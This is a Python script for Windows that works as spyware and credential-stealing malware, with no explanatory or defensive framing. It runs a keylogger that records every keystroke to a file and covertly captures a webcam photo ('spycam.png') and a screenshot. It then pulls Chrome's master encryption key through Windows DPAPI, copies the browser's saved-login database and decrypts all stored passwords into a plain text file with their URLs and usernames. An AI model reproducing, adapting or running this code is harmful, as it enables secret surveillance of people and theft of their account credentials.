import sqlite3
from pynput.keyboard import Listener
from datetime import datetime, timedelta
import cv2
import pyautogui
import os
import json
import base64
import shutil
import win32crypt
from Cryptodome.Cipher import AES

# ------------ key locker

special_keys = {
    '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7', '<104>': '8',
    '<105>': '9',
    'Key.ctrl_l': '[Control-L]', 'Key.ctrl_r': '[Control-R]', 'Key.cmd': '[Win]', 'Key.caps_lock': '[Caps-lock]',
    'Key.alt_gr': 'Alt-r', 'Key.enter': '[Enter]', 'Key.space': '[Space]', 'Key.tab': '[Tab]', 'Key.alt_l': '[Alt-L]',
    'Key.shift': '[shift]', 'Key.shift_r': '[shift]', 'Key.backspace': '[BackSpace]',
}


def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("kl.txt", "a") as f:
        if listen == "Key.esc":
            f.write(listen + '\n')
        else:
            f.write(listen + ', ')


start = datetime.now()
end = start + timedelta(seconds=10)


def on_release(key):
    if str(key) == "Key.esc":
        return False
    # if datetime.now() >= end:
    #     return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# webcam image -----------------

camera = cv2.VideoCapture(0)
ret, frame = camera.read()
if ret:
    cv2.imwrite("spycam.png", frame)

camera.release()
# cv2.destroyWindow()


# screen --------------

my_screenshot = pyautogui.screenshot()
my_screenshot.save("screenshot.png")


# password chrome
# # Key

file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
with open(file_path, 'r', encoding='utf8') as f:
    jn_data = f.read()
    py_data = json.loads(jn_data)

encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
key = win32crypt.CryptUnprotectData(encryption_key)[1]

# # get passwords


def pass_decryption(password, encrypt_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encrypt_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return "No Passwords"


db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
file_name = "ch_pass.db"
shutil.copyfile(db_path, file_name)
db = sqlite3.connect(file_name)
cursor = db.cursor()
cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_last_used")
with open("ch_pass.txt", "w", encoding="utf8") as pf:
    for row in cursor.fetchall():
        main_url = row[0]
        login_url = row[1]
        user_name = row[2]
        password = pass_decryption(row[3], key)
        if user_name or password:
            pf.write(f'main_url: {main_url}\n')
            pf.write(f'login_url: {login_url}\n')
            pf.write(f'user_name: {user_name}\n')
            pf.write(f'password: {password}\n')
            pf.write('-' * 50 + '\n')

cursor.close()
db.close()
os.remove(file_name)























